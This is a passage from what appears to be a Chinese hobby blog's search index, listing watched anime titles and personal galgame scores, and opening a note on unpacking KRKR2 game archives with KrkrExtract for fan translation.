<p>\u5929\u4f7f\u76843P!</p> <p>\u5929\u4f7f\u964d\u4e34\u5230\u4e86\u6211\u8eab\u8fb9</p> <p>\u5929\u4f53\u7684\u79e9\u5e8f</p> <p>\u5929\u5143\u7a81\u7834\u7ea2\u83b2\u87ba\u5ca9</p> <p>\u51f8\u53d8\u82f1\u96c4</p> <p>\u7a81\u51fb\u8389\u8389</p> <p>\u5f92\u7136\u559c\u6b22\u4f60</p>"},{"location":"blog/Anime/%E7%95%AA%E5%89%A7/#u","title":"U","text":"<p>Urara\u8ff7\u8def\u5e16</p>"},{"location":"blog/Anime/%E7%95%AA%E5%89%A7/#v","title":"V","text":""},{"location":"blog/Anime/%E7%95%AA%E5%89%A7/#w","title":"W","text":"<p>Wonder Egg Priority</p> <p>\u4f2a\u604b</p> <p>\u536b\u5bab\u5bb6\u4eca\u5929\u7684\u996d</p> <p>\u4e3a\u7f8e\u597d\u7684\u4e16\u754c\u732e\u4e0a\u7206\u7130</p> <p>\u4e3a\u7f8e\u597d\u7684\u4e16\u754c\u732e\u4e0a\u795d\u798f\uff01</p> <p>\u672a\u6765\u90fd\u5e02NO.6</p> <p>\u672a\u6765\u65e5\u8bb0</p> <p>\u672a\u95fb\u82b1\u540d</p> <p>\u851a\u84dd\u6863\u6848</p> <p>\u6587\u8c6a\u91ce\u72ac</p> <p>\u95ee\u9898\u513f\u7ae5\u90fd\u6765\u81ea\u5f02\u4e16\u754c\uff1f</p> <p>\u6211\uff0c\u8981\u6210\u4e3a\u53cc\u9a6c\u5c3e</p> <p>\u6211\u4e0d\u662f\u8bf4\u4e86\u80fd\u529b\u8981\u5e73\u5747\u503c\u4e48</p> <p>\u6211\u7684\u8111\u5185\u604b\u788d\u9009\u9879</p> <p>\u6211\u7684\u9752\u6625\u604b\u7231\u7269\u8bed\u679c\u7136\u6709\u95ee\u9898</p> <p>\u6211\u72ec\u81ea\u5347\u7ea7</p> <p>\u6211\u7acb\u4e8e\u767e\u4e07\u751f\u547d\u4e4b\u4e0a</p> <p>\u6211\u4eec\u7684\u91cd\u5236\u4eba\u751f</p> <p>\u6211\u4eec\u771f\u7684\u5b66\u4e0d\u6765</p> <p>\u6211\u5973\u53cb\u4e0e\u9752\u6885\u7af9\u9a6c\u7684\u60e8\u70c8\u4fee\u7f57\u573a</p> <p>\u6211\u63a8\u7684\u5b69\u5b50</p> <p>\u6211\u63a8\u662f\u53cd\u6d3e\u5927\u5c0f\u59d0</p> <p>\u6211\u559c\u6b22\u7684\u662f\u5c0f\u8bf4\u91cc\u7684\u4f60</p> <p>\u4e4c\u9f99\u6d3e\u51fa\u6240</p> <p>\u65e0\u5f69\u9650\u7684\u602a\u7075\u4e16\u754c</p> <p>\u65e0\u826f\u516c\u4f1a</p> <p>\u65e0\u540d\u8bb0\u5fc6</p> <p>\u65e0\u80fd\u529b\u8005\u5a1c\u5a1c</p> <p>\u65e0\u795e\u4e16\u754c\u7684\u795e\u660e\u6d3b\u52a8</p> <p>\u65e0\u989c\u4e4b\u6708</p> <p>\u65e0\u804c\u8f6c\u751f</p> <p>\u7269\u7406\u9b54\u6cd5\u4f7f\u9a6c\u4fee</p> <p>\u7269\u8bed\u7cfb\u5217</p> <p>\u4e3a\u4f55\u6211\u7684\u4e16\u754c\u88ab\u9057\u5fd8\u4e86</p>"},{"location":"blog/Anime/%E7%95%AA%E5%89%A7/#x","title":"X","text":"<p>\u559c\u6b22\u672c\u5927\u7237\u7684\u7adf\u7136\u5c31\u4f60\u4e00\u4e2a\uff1f</p> <p>\u590f\u6d1b\u7279</p> <p>\u590f\u65e5\u91cd\u73b0</p> <p>\u8d24\u8005\u4e4b\u5b59</p> <p>\u76f8\u5408\u4e4b\u7269</p> <p>\u9999\u683c\u91cc\u62c9\u8fb9\u5883</p> <p>\u60f3\u8981\u6210\u4e3a\u5f71\u4e4b\u5b9e\u529b\u8005</p> <p>\u5411\u5c71\u8fdb\u53d1</p> <p>\u5c0f\u4e0d\u70b9\u793e\u957f</p> <p>\u5c0f\u6797\u5bb6\u7684\u9f99\u5973\u4ec6</p> <p>\u90aa\u795e\u4e0e\u53a8\u4e8c\u75c5\u5c11\u5973</p> <p>\u65b0\u59b9\u9b54\u738b\u7684\u5951\u7ea6\u8005</p> <p>\u661f\u523b\u7684\u9f99\u9a91\u58eb</p> <p>\u661f\u7075\u611f\u5e94</p> <p>\u5e78\u8fd0\u661f</p> <p>\u718a\u718a\u52c7\u95ef\u5f02\u4e16\u754c</p> <p>\u865a\u6784\u63a8\u7406</p> <p>\u5b66\u56ed\u5b64\u5c9b</p> <p>\u5b66\u6218\u90fd\u5e02Asterisk</p> <p>\u8840\u754c\u6218\u7ebf</p>"},{"location":"blog/Anime/%E7%95%AA%E5%89%A7/#y","title":"Y","text":"<p>\u708e\u708e\u6d88\u9632\u961f</p> <p>\u6f14\u5267\u5076\u50cf</p> <p>\u5996\u72d0X\u4ec6SS</p> <p>\u6447\u66f3\u767e\u5408</p> <p>\u6447\u66f3\u9732\u8425</p> <p>\u9065\u7684\u63a5\u7403</p> <p>\u91ce\u826f\u795e</p> <p>\u591c\u665a\u7684\u6c34\u6bcd\u4e0d\u6e38\u6cf3</p> <p>\u591c\u6a31\u5bb6\u5927\u4f5c\u6218</p> <p>\u4e00\u8d77\u4e00\u8d77\u8fd9\u91cc\u90a3\u91cc</p> <p>\u4e00\u62f3\u8d85\u4eba</p> <p>\u4e00\u5468\u7684\u670b\u53cb</p> <p>\u5f02\u4e16\u754c\u5f97\u5230\u5f00\u6302\u80fd\u529b\u7684\u6211\u2026</p> <p>\u5f02\u4e16\u754c\u8205\u8205</p> <p>\u5f02\u4e16\u754c\u8ff7\u5bab\u7684\u540e\u5bab\u751f\u6d3b</p> <p>\u5f02\u4e16\u754c\u8ff7\u5bab\u9ed1\u5fc3\u4f01\u4e1a</p> <p>\u5f02\u4e16\u754c\u56db\u91cd\u594f\u00a0</p> <p>\u5f02\u4fee\u7f57</p> <p>\u56e0\u4e3a\u4e0d\u662f\u771f\u6b63\u7684\u4f19\u4f34\u800c\u88ab\u9010\u51fa\u52c7\u8005\u961f\u4f0d\u6d41\u843d\u5230\u8fb9\u5883\u5c55\u5f00\u6162\u6d3b\u4eba\u751f</p> <p>\u56e0\u4e3a\u592a\u6015\u75db\u5c31\u5168\u70b9\u9632\u5fa1\u529b\u4e86</p> <p>\u9634\u6674\u4e0d\u5b9a\u5927\u54e5\u54e5</p> <p>\u94f6\u9b42</p> <p>\u9690\u7792\u4e4b\u4e8b</p> <p>\u82f1\u96c4\u6559\u5ba4</p> <p>\u82f1\u96c4\u738b\u4e3a\u4e86\u7a77\u5c3d\u6b66\u9053\u8f6c\u751f</p> <p>\u6a31Trick</p> <p>\u6a31\u82b1\u4efb\u52a1</p> <p>\u6a31\u82b1\u5e84\u7684\u5ba0\u7269\u5973\u5b69</p> <p>\u8424\u706b\u4e4b\u68ee</p> <p>\u52c7\u6c14\u7206\u53d1bangbravern</p> <p>\u52c7\u8005\u8f9e\u804c\u4e0d\u5e72\u4e86</p> <p>\u52c7\u8005\u8d6b\u9c81\u5e93</p> <p>\u60a0\u54c9\u65e5\u5e38\u5927\u738b</p> <p>\u60a0\u54c9\u8d5b\u9a6c\u5a18</p> <p>\u6e38\u620f\u4eba\u751f</p> <p>\u6e38\u620f\u738b</p> <p>\u5e7c\u5973\u6218\u8bb0</p> <p>\u4e0e\u53d8\u6210\u4e86\u5f02\u4e16\u754c\u7f8e\u5c11\u5973\u7684\u5927\u53d4\u4e00\u8d77\u5192\u9669</p> <p>\u5b87\u5d0e\u5b66\u59b9\u60f3\u8981\u73a9</p> <p>\u5b87\u5b99\u5de1\u8b66\u9732\u9732\u5b50</p> <p>\u7389\u5b50\u5e02\u573a</p> <p>\u5143\u6c14\u5c11\u5973\u7f18\u7ed3\u795e</p> <p>\u7f18\u4e4b\u7a7a</p> <p>\u7ea6\u5b9a\u7684\u68a6\u5e7b\u5c9b</p> <p>\u7ea6\u4f1a\u5927\u4f5c\u6218</p> <p>\u6708\u5149\u4e0b\u7684\u5f02\u4e16\u754c\u4e4b\u65c5</p> <p>\u6708\u520a\u5c11\u5973\u91ce\u5d0e\u541b</p> <p>\u6708\u8272\u771f\u7f8e</p> <p>\u5f02\u4e16\u754c\u5931\u683c</p> <p>\u4f9d\u9760\u88ab\u5acc\u5f03\u7684\u3010\u72b6\u6001\u5f02\u5e38\u6280\u80fd\u3011\u800c\u6210\u4e3a\u6700\u5f3a\u7684\u6211\u6700\u7ec8\u8e42\u8e8f\u4e00\u5207</p> <p>\u5f02\u4e16\u754c\u9b54\u738b\u4e0e\u53ec\u5524\u5c11\u5973\u7684\u5974\u96b6\u9b54\u672f</p>"},{"location":"blog/Anime/%E7%95%AA%E5%89%A7/#z","title":"Z","text":"<p>\u518d\u89c1\u7edd\u671b\u5148\u751f</p> <p>\u5728\u5730\u4e0b\u57ce\u5bfb\u6c42\u9082\u9005\u662f\u5426\u641e\u9519\u4e86\u4ec0\u4e48</p> <p>\u5728\u9b54\u738b\u57ce\u8bf4\u665a\u5b89</p> <p>\u5728\u4e0b\u5742\u672c\uff0c\u6709\u4f55\u8d35\u5e72\uff1f</p> <p>\u846c\u9001\u7684\u8299\u8389\u83b2</p> <p>\u65a9\u00b7\u8d64\u7ea2\u4e4b\u77b3</p> <p>\u65a9\u670d\u5c11\u5973</p> <p>\u6218\u00d7\u604b</p> <p>\u6218\u961f\u5927\u5931\u683c</p> <p>\u8fd9\u4e2a\u662f\u50f5\u5c38\u5417\uff1f</p> <p>\u8fd9\u4e2a\u52c7\u8005\u660e\u660e\u8d85\u5f3a\u5374\u8fc7\u5206\u614e\u91cd</p> <p>\u8fd9\u4e2a\u6cbb\u7597\u6709\u70b9\u70e6</p> <p>\u4fa6\u63a2\u5df2\u7ecf\u6b7b\u4e86</p> <p>\u7ec7\u7530\u8089\u6842\u4fe1\u957f</p> <p>\u53ea\u8981\u8d1d\u5c14\u54f2\u5e03\u5e03\u5927\u5c0f\u59d0\u559c\u6b22\u5c31\u597d</p> <p>\u53ea\u8981\u53ef\u7231\u5373\u4f7f\u662f\u53d8\u6001\u4f60\u4e5f\u4f1a\u559c\u6b22\u6211\u5427\uff1f</p> <p>\u53ea\u6709\u6211\u80fd\u8fdb\u5165\u7684\u9690\u85cf\u8ff7\u5bab</p> <p>\u81f3\u9ad8\u6307\u4ee4</p> <p>\u6cbb\u6108\u9b54\u6cd5\u7684\u9519\u8bef\u4f7f\u7528\u65b9\u5f0f</p> <p>\u81f4\u4e0d\u706d\u7684\u4f60</p> <p>\u4e2d\u4e8c\u75c5\u4e5f\u8981\u8c08\u604b\u7231\uff01</p> <p>\u7ec8\u5c06\u6210\u4e3a\u4f60</p> <p>\u7ec8\u7ed3\u7684\u70bd\u5929\u4f7f</p> <p>\u7ec8\u672b\u7684\u540e\u5bab</p> <p>\u91cd\u521b\u7684\u4f24\u53e3</p> <p>\u91cd\u542f\u54b2\u826f\u7530</p> <p>\u5492\u672f\u56de\u6218</p> <p>\u8f6c\u751f\u6210\u4e3a\u4e86\u53ea\u6709\u4e59\u5973\u6e38\u620f\u7834\u706dFlag\u7684\u90aa\u6076\u5927\u5c0f\u59d0</p> <p>\u8f6c\u751f\u6210\u8718\u86db\u53c8\u600e\u4e48\u6837</p> <p>\u8f6c\u751f\u53f2\u83b1\u59c6\u65e5\u8bb0</p> <p>\u8f6c\u751f\u738b\u5973\u4e0e\u5929\u624d\u5343\u91d1\u7684\u9b54\u6cd5\u9769\u547d</p> <p>\u88c5\u7532\u5a18\u6218\u673a</p> <p>\u707c\u773c\u7684\u590f\u5a1c</p> <p>\u7d2b\u7f57\u5170\u6c38\u6052\u82b1\u56ed </p> <p>\u81ea\u79f0\u8d24\u8005\u5f1f\u5b50\u7684\u8d24\u8005</p> <p>\u603b\u4e4b\u5c31\u662f\u975e\u5e38\u53ef\u7231</p> <p>\u79df\u501f\u5973\u53cb</p> <p>\u6700\u5f3a\u8089\u76fe\u7684\u8ff7\u5bab\u653b\u7565\uff5e\u62e5\u6709\u7a00\u5c11\u6280\u80fd\u4f53\u529b9999\u7684\u8089\u76fe\uff0c\u88ab\u52c7\u8005\u961f\u4f0d\u8f9e\u9000\u4e86\uff5e</p> <p>\u7f6a\u6076\u738b\u51a0</p> <p>\u4f50\u8d3a\u5076\u50cf\u662f\u4f20\u5947</p> <p>\u4f50\u4f50\u6728\u548c\u6587\u9e1f\u5c0f\u54d4</p> <p>\u6756\u4e0e\u5251\u7684\u9b54\u5251\u8c2d</p> <p>\u8fd9\u4e2a\u4e16\u754c\u6f0f\u6d1e\u767e\u51fa</p>"},{"location":"blog/Anime/%E7%95%AA%E5%89%A7/#_1","title":"\u7535\u5f71(\u968f\u7f18\u5199)","text":"<ul> <li>\u77e5\u6653\u5929\u7a7a\u4e4b\u84dd\u7684\u4eba\u554a</li> <li>\u5929\u6c14\u4e4b\u5b50</li> <li>\u5439\u54cd\uff01\u60a0\u98ce\u53f7\uff5e\u8a93\u8a00\u7684\u7ec8\u7ae0\uff5e</li> <li>\u5229\u5179\u4e0e\u9752\u9e1f</li> <li>\u547d\u8fd0\u4e4b\u591c\u2014\u2014\u5929\u4e4b\u676f</li> <li>Code Geass \u590d\u6d3b\u7684\u9c81\u8def\u4fee</li> <li>\u6211\u60f3\u5403\u6389\u4f60\u7684\u80f0\u810f</li> <li>\u671d\u82b1\u5915\u8a93\u2014\u2014\u4e8e\u79bb\u522b\u4e4b\u671d\u675f\u8d77\u7ea6\u5b9a\u4e4b\u82b1</li> <li>NO GAME NO LIFE \u6e38\u620f\u4eba\u751f ZERO</li> <li>\u96ea\u4e0b\u7684\u8a93\u8a00</li> <li>\u70df\u82b1</li> <li>\u58f0\u4e4b\u5f62</li> <li>\u7389\u5b50\u7231\u60c5\u6545\u4e8b</li> <li>\u7a7a\u4e4b\u5883\u754c</li> <li>\u6211\u4eec\u4ecd\u672a\u77e5\u9053\u90a3\u5929\u6240\u770b\u89c1\u7684\u82b1\u7684\u540d\u5b57</li> <li>\u8a00\u53f6\u4e4b\u5ead</li> <li>\u666e\u7f57\u7c73\u4e9a</li> <li>\u4f60\u7684\u540d\u5b57</li> <li>\u79d2\u901f5\u5398\u7c73</li> <li>\u771f\u5fc3\u4e3a\u4f60</li> </ul>"},{"location":"blog/Anime/%E7%95%AA%E5%89%A7/#towatch","title":"ToWatch","text":"<ul> <li>rewrite</li> <li>little buster\uff01</li> <li>cirtus</li> <li>\u604b\u7231\u9009\u4e3e\u5de7\u514b\u529b</li> <li>\u82cd\u4e4b\u5f7c\u65b9\u7684\u56db\u91cd\u594f</li> <li>\u5883\u754c\u7684\u5730\u5e73\u7ebf</li> <li>\u6a31trick</li> </ul>"},{"location":"blog/Galgame/%E4%B8%AA%E4%BA%BA%E8%AF%84%E4%BB%B7/","title":"\u4e2a\u4eba\u8bc4\u4ef7","text":""},{"location":"blog/Galgame/%E4%B8%AA%E4%BA%BA%E8%AF%84%E4%BB%B7/#galgame","title":"Galgame \u4e3b\u89c2\u8bc4\u5206","text":"<p> \u7ea6 835 \u4e2a\u5b57  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 4 \u5206\u949f</p> <p>\u4e2a\u4eba\u4ee5\u4e03\u5206\u4e3a\u6b63\u5e38gal\u7684\u57fa\u51c6</p> <p>\u5b87\u5b99\u514d\u8d23\u58f0\u660e</p> <p>\u8bb8\u591a\u76f8\u5173\u7684\u4f5c\u54c1\u91c7\u53d6\u7eb5\u5411\u6bd4\u8f83\u7684\u65b9\u5f0f\uff0c\u5982\u661f\u5149\u5496\u5561\u9986\u5c31\u662f\u4e0e\u5176\u5b83\u67da\u5b50\u793e\u4f5c\u54c1\u4f5c\u6bd4\u8f83\uff0c\u5e76\u4e0d\u4e00\u5b9a\u5c31\u662f\u5b83\u80fd\u8ddf \u7535\u6ce2\u6d88\u901d\u4e4b\u65e5 \u4e00\u6837\u70c2\u7684\u610f\u601d </p> <p>\u505a\u4e86\u4e2a\u6bcf\u5468\u81ea\u52a8 Fetch \u6211\u7684\u8bc4\u5206\u6570\u636e\u7684\u7f51\u7ad9\uff0c\u8fd9\u91cc\u53ef\u80fd\u53ea\u4f1a\u5076\u5c14\u8fdb\u884c\u540c\u6b65\u5566\u3002</p>"},{"location":"blog/Galgame/%E4%B8%AA%E4%BA%BA%E8%AF%84%E4%BB%B7/#10","title":"10\u5206\u4f5c\u54c1 \u795e\u4e2d\u795e","text":"\u65e5\u6587\u540d \u4e2d\u6587\u540d \u7d19\u306e\u4e0a\u306e\u9b54\u6cd5\u4f7f\u3044 \u7eb8\u4e0a\u9b54\u6cd5\u4f7f \u7d20\u6674\u3089\u3057\u304d\u65e5\u3005\uff5e\u4e0d\u9023\u7d9a\u5b58\u5728\uff5e \u7f8e\u597d\u7684\u6bcf\u4e00\u5929 ~ \u4e0d\u8fde\u7eed\u7684\u5b58\u5728 ~ \u91d1\u8272\u30e9\u30d6\u30ea\u30c3\u30c1\u30a7 \u91d1\u8f89\u604b\u66f2\u56db\u91cd\u594f Ambitious Mission Ambitious Mission \u5bbf\u661f\u306e\u30ac\u30fc\u30eb\u30d5\u30ec\u30f3\u30c9 \u5bbf\u661fGirlfriend \u30b5\u30af\u30e9\u30ce\u8a69\uff0d\u6afb\u306e\u68ee\u306e\u4e0a\u3092\u821e\u3046\uff0d \u6a31\u4e4b\u8bd7 - \u5728\u6a31\u4e4b\u68ee\u4e0a\u8d77\u821e - \u30b5\u30af\u30e9\u30ce\u523b\uff0d\u6afb\u306e\u68ee\u306e\u4e0b\u3092\u6b69\u3080\uff0d \u6a31\u4e4b\u523b - \u5728\u6a31\u4e4b\u68ee\u4e0b\u6f2b\u6b65 - Summer Pockets \u590f\u65e5\u53e3\u888b \u30ea\u30c8\u30eb\u30d0\u30b9\u30bf\u30fc\u30ba\uff01 Little Busters! \u7d42\u306e\u30b9\u30c6\u30e9 \u661f\u4e4b\u7ec8\u9014 \u7a62\u7ffc\u306e\u30e6\u30fc\u30b9\u30c6\u30a3\u30a2 \u79fd\u7ffc\u7684\u5c24\u65af\u8482\u4e9a \u30ad\u30e9\u2606\u30ad\u30e9 KIRA\u2606KIRA \u714c\u714c\u821e\u53f0 \u30b9\u30fc\u30d1\u30fc\u30c0\u30f3\u30ac\u30f3\u30ed\u30f3\u30d12 \u3055\u3088\u306a\u3089\u7d76\u671b\u5b66\u5712 \u8d85\u7ea7\u5f39\u4e38\u8bba\u78342 \u518d\u89c1\u7edd\u671b\u5b66\u56ed"},{"location":"blog/Galgame/%E4%B8%AA%E4%BA%BA%E8%AF%84%E4%BB%B7/#9","title":"9\u5206\u4f5c\u54c1 \u975e\u5e38\u4f18\u79c0","text":"\u65e5\u6587\u540d \u4e2d\u6587\u540d \u306f\u3064\u3086\u304d\u3055\u304f\u3089 \u521d\u96ea\u6a31 9-nine- 9-nine- \u7cfb\u5217 \u30cf\u30df\u30c0\u30b7\u30af\u30ea\u30a8\u30a4\u30c6\u30a3\u30d6 \u5e38\u8f68\u8131\u79bbcreative \u305d\u306e\u82b1\u3073\u3089\u306b\u304f\u3061\u3065\u3051\u3092 \u4eb2\u543b\u90a3\u7247\u82b1\u74e3 \u30de\u30eb\u30b3\u3068\u9280\u6cb3\u7adc \u4e38\u5b50\u4e0e\u94f6\u6cb3\u9f99 \u30aa\u30c8\u30e1\uff0a\u30c9\u30e1\u30a4\u30f3 \u5c11\u5973 * \u9886\u57df \u6c99\u8036\u306e\u5504 \u6c99\u8036\u4e4b\u6b4c Narcissu \u6c34\u4ed9 \u88c5\u7532\u60aa\u9b3c\u6751\u6b63 \u88c5\u7532\u6076\u9b3c\u6751\u6b63 Rewrite Rewrite \u30e9\u30f3\u30b9 \u5170\u65af Holy Undead \u5723\u5973\u4e0d\u6b7b\u5fc3 \u4ffa\u306e\u77b3\u3067\u4e38\u88f8\uff01\u4e0d\u53ef\u77e5\u306a\u672a\u6765\u3068\u8996\u900f\u304b\u3059\u904b\u547d \u6211\u7684\u773c\u775b\u80fd\u770b\u5149\u5149"},{"location":"blog/Galgame/%E4%B8%AA%E4%BA%BA%E8%AF%84%E4%BB%B7/#8","title":"8\u5206\u4f5c\u54c1 \u7a33\u4e2d\u5e26\u597d\u3001\u7279\u957f\u8fc7\u4eba","text":"\u65e5\u6587\u540d \u4e2d\u6587\u540d ATRI -My Dear Moments- \u4e9a\u6258\u5229 - \u6211\u631a\u7231\u7684\u65f6\u5149 - \u30ce\u30e9\u3068\u7687\u5973\u3068\u91ce\u826f\u732b\u30cf\u30fc\u30c8 \u91ce\u826f\u4e0e\u7687\u5973\u4e0e\u6d41\u6d6a\u732b\u4e4b\u5fc3 \u30b5\u30ce\u30d0\u30a6\u30a3\u30c3\u30c1 \u9b54\u5973\u7684\u591c\u5bb4 \u5343\u604b\uff0a\u4e07\u82b1 \u5343\u604b * \u4e07\u82b1 \u6708\u306b\u5bc4\u308a\u305d\u3046\u4e59\u5973\u306e\u4f5c\u6cd5 \u8fd1\u6708\u5c11\u5973\u7684\u793c\u4eea Eden* Eden* \u304a\u5144\u3061\u3083\u3093\u3001\u671d\u307e\u3067\u305a\u3063\u3068\u30ae\u30e5\u30c3\u3066\u3057\u3066\uff01 \u54e5\u54e5\uff0c\u65e9\u4e0a\u4e4b\u524d\u62b1\u7d27\u6211 \u5411\u65e5\u8475\u306e\u6559\u4f1a\u3068\u9577\u3044\u590f\u4f11\u307f \u5411\u65e5\u8475\u6559\u4f1a\u4e0e\u957f\u957f\u7684\u6691\u5047 \u30a2\u30de\u30c4\u30c4\u30df \u5929\u6d25\u7f6a \u6c34\u846c\u9280\u8ca8\u306e\u30a4\u30b9\u30c8\u30ea\u30a2 \u6c34\u846c\u94f6\u8d27\u7684\u963f\u65af\u7279\u91cc\u4e9a \u3055\u304f\u3089\u3001\u3082\u3086 \u6a31\u82b1\uff0c\u840c\u653e \u8ee2\u6027\u9b54\u738b\u3055\u307e\u306f\u52c7\u8005\u306b\u52dd\u3066\u306a\u3044\uff01"},{"location":"blog/Galgame/%E4%B8%AA%E4%BA%BA%E8%AF%84%E4%BB%B7/#7","title":"7\u5206\u4f5c\u54c1 \u4e2d\u89c4\u4e2d\u77e9\u3001\u529f\u8fc7\u76f8\u62b5","text":"\u65e5\u6587\u540d \u4e2d\u6587\u540d Ginka Ginka \u82b1\u54b2\u30ef\u30fc\u30af\u30b9\u30d7\u30ea\u30f3\u30b0\uff01 \u82b1\u54b2workspring \u304d\u307e\u3050\u308c\u30c6\u30f3\u30d7\u30c6\u30fc\u30b7\u30e7\u30f3 \u5f02\u60f3\u9b45\u60d1 \u307e\u3057\u308d\u8272\u30b7\u30f3\u30d5\u30a9\u30cb\u30fc \u7eaf\u767d\u4ea4\u54cd\u66f2 RIDDLE JOKER RIDDLE JOKER \u3055\u304f\u3089\u306e\u96f2\uff0a\u30b9\u30ab\u30a2\u30ec\u30c3\u30c8\u306e\u604b \u6a31\u8272\u4e4b\u4e91 * \u7eef\u8272\u4e4b\u604b SaDistic BlooD \u72c2\u55dc\u4e4b\u8840 MinDeaD BlooD \u732e\u7ed9\u652f\u914d\u8005\u7684\u72c2\u6b7b\u66f2 3days\uff5e\u6e80\u3061\u3066\u3086\u304f\u523b\u306e\u5f7c\u65b9\u3067\uff5e 3days~ \u5728\u901d\u53bb\u65f6\u95f4\u7684\u53e6\u4e00\u7aef~ Doki Doki Literature Club \u5fc3\u8df3\u6587\u5b66\u90e8 \u82cd\u306e\u5f7c\u65b9\u306e\u30d5\u30a9\u30fc\u30ea\u30ba\u30e0 \u82cd\u4e4b\u5f7c\u65b9\u7684\u56db\u91cd\u594f Making * Lovers \u7a81\u7136 * \u604b\u4eba Select Oblige \u5929\u9009\u5eb6\u6c11\u7684\u771f\u547d\u4e4b\u9009 \u30cb\u30e5\u30fc\u30c0\u30f3\u30ac\u30f3\u30ed\u30f3\u30d1V3 \u307f\u3093\u306a\u306e\u30b3\u30ed\u30b7\u30a2\u30a4\u65b0\u5b66\u671f \u65b0\u5f39\u4e38\u8bba\u7834v3"},{"location":"blog/Galgame/%E4%B8%AA%E4%BA%BA%E8%AF%84%E4%BB%B7/#6","title":"6\u5206\u4f5c\u54c1 \u89c1\u4ec1\u89c1\u667a\u3001\u7565\u663e\u65e0\u8da3","text":"\u65e5\u6587\u540d \u4e2d\u6587\u540d \u3075\u3086\u304b\u3089\u3001\u304f\u308b\u308b \u51ac\u65c5\u3001\u65b9\u51a5\u51a5 \u3042\u304d\u3086\u3081\u304f\u304f\u308b \u79cb\u591c\u68a6\u8426\u8426 \u9b54\u6cd5\u5c11\u5973\u6d88\u8017\u6226\u7dda Dead\u03a9Aegis \u9b54\u6cd5\u5c11\u5973\u6d88\u8017\u6218\u7ebf Dead\u03a9Aegis \u5929\u4f7f\u2606\u9a12\u3005 RE-BOOT! \u5929\u4f7f\u2606\u56a3\u56a3 RE-BOOT! \u67af\u308c\u306a\u3044\u4e16\u754c\u3068\u7d42\u308f\u308b\u82b1 \u6c38\u4e0d\u67af\u840e\u7684\u4e16\u754c\u4e0e\u7ec8\u7109\u4e4b\u82b1 \u30ac\u30de\u30f3\u304c\u3067\u304d\u306a\u3044\u7ae5\u8c9e\u5144\u30ad\u3068\u3001\u30b9\u30ca\u30aa\u306b\u306a\u308c\u306a\u3044\u53cd\u6297\u59b9 \u65e0\u6cd5\u5fcd\u8010\u7684\u5904\u7537\u54e5\u54e5\u548c\u4e0d\u76f4\u7387\u7684\u53db\u9006\u59b9\u59b9 \u3054\u4e3b\u4eba\u69d8\u3001\u30bb\u30a4\u30e9\u306b\u5922\u307f\u305f\u3044\u306a\u3044\u3061\u3083\u30e9\u30d6\u3054\u5949\u4ed5\u3055\u305b\u3066\u3044\u305f\u3060\u3051\u307e\u3059\u304b \u4e3a\u4e3b\u4eba\u732e\u4e0a\u5723\u7f57\u7684\u751c\u871c\u4f8d\u5949"},{"location":"blog/Galgame/%E4%B8%AA%E4%BA%BA%E8%AF%84%E4%BB%B7/#5","title":"5\u5206\u4f5c\u54c1 \u5199\u7684\u4ec0\u4e48\u73a9\u610f","text":"\u65e5\u6587\u540d \u4e2d\u6587\u540d \u55ab\u8336\u30b9\u30c6\u30e9\u3068\u6b7b\u795e\u306e\u8776 \u661f\u5149\u5496\u5561\u9986\u4e0e\u6b7b\u795e\u4e4b\u8776 \u51fa\u4f1a\u3063\u30665\u5206\u306f\u4ffa\u306e\u3082\u306e\uff01 \u6642\u9593\u505c\u6b62\u3068\u4e0d\u53ef\u907f\u306a\u904b\u547d \u76f8\u9047\u4e94\u5206\u949f\u5c5e\u4e8e\u6211\uff01\u65f6\u95f4\u505c\u6b62\u4e0e\u4e0d\u53ef\u907f\u7684\u547d\u8fd0 \u7d46\u304d\u3089\u3081\u304f\u604b\u3044\u308d\u306f \u7275\u7eca\u95ea\u8000\u7684\u604b\u4e4b\u4f0a\u5415\u6ce2 \u30c6\u30ec\u30d3\u306e\u6d88\u3048\u305f\u65e5 \u7535\u6ce2\u6d88\u901d\u4e4b\u65e5 \u59b9\u8abf\u6559\u65e5\u8a18 \u59b9\u8c03\u6559\u65e5\u8bb0 \u30a8\u30ed\u672c\u3092\u6368\u3066\u3066\u304b\u3089\u5144\u306e\u69d8\u5b50\u304c\u304a\u304b\u3057\u3044 \u6254\u6389\u9ec4\u4e66\u540e\u5144\u957f\u60c5\u51b5\u6709\u5f02"},{"location":"blog/Galgame/%E6%B1%89%E5%8C%96/","title":"\u6c49\u5316","text":""},{"location":"blog/Galgame/%E6%B1%89%E5%8C%96/#galgame","title":"Galgame \u6c49\u5316","text":"<p> \u7ea6 1540 \u4e2a\u5b57  19 \u884c\u4ee3\u7801  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 8 \u5206\u949f</p>"},{"location":"blog/Galgame/%E6%B1%89%E5%8C%96/#_1","title":"\u89e3\u5305","text":"<p>\u514d\u8d23\u58f0\u660e</p> <p>\u89e3\u5305\u5b9e\u9645\u4e0a\u662f\u4fb5\u6743\u884c\u4e3a\uff0c\u672c\u4eba\u4ec5\u4ec5\u51fa\u4e8e\u5b66\u4e60\u76ee\u7684\u5199\u4e0b\u8be5\u7b14\u8bb0</p> <p>\u6839\u636e\u6e38\u620f\u5f15\u64ce\u7684\u4e0d\u540c\uff0cgalgame\u5382\u5546\u4f1a\u5c06\u6e38\u620f\u6253\u5305\u6210\u4e0d\u540c\u7684\u7279\u6b8a\u683c\u5f0f(\u5e38\u89c1\u7684\u6709<code>.dat</code>,<code>.arc</code>,<code>.xp3</code>\u7b49)</p>"},{"location":"blog/Galgame/%E6%B1%89%E5%8C%96/#krkr2","title":"KRKR2","text":"<p>\u89e3\u5305\u7528\u5de5\u5177\uff1a</p> <ul> <li>Xp3Viewer (2016\u4ee5\u524d)</li> <li>krkrextract (2016\u4ee5\u540e)</li> </ul> <p>\u4ee5 krkrextract \u4e3a\u4f8b</p> <p>\u4ece github \u4e0a\u4e0b\u8f7d krkrextract 4.0 \u7248\u672c(https://github.com/xmoezzz/KrkrExtract/releases/tag/4.0.1.5)</p> <p>\u5c06\u4e0b\u8f7d\u540e\u7684 <code>exe</code> \u6587\u4ef6\u53ca <code>dll</code> \u6587\u4ef6\u590d\u5236\u5230\u5e0c\u671b\u89e3\u5305\u7684 KRKR2 \u6e38\u620f\u6839\u76ee\u5f55\u4e0b\uff0c\u5c06\u6e38\u620f\u542f\u52a8\u53ef\u6267\u884c\u6587\u4ef6\u62d6\u5230 <code>KrkrExtract.exe</code> \u4e0a\uff0c\u4f1a\u5f39\u51fa\u4e00\u4e2a\u7a97\u53e3\uff0c\u5982\u679c\u5e0c\u671b\u89e3\u5305\u5f97\u5230 CG 